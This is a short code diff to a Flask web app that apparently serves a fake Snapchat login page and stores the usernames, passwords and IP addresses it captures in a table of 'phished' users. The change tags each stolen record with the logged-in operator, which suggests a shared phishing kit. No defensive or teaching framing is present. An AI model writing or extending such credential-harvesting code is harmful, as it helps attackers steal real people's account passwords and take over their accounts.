@@ -1,5 +1,5 @@
 from app import app, db
-from flask import request, render_template
+from flask import request, render_template, session
 from app.main.config.models import Phish
 
 @app.route('/snapchat/login', methods=['GET','POST'])
@@ -9,6 +9,7 @@ def sc_login():
     elif request.method == 'POST':
         data = request.form.to_dict()
         user_phished = Phish(platform='Snapchat',
+                             owner=session["curr"],
                              phised_user=data["username"],
                              phished_pword=data["password"],
                              ip=request.remote_addr)
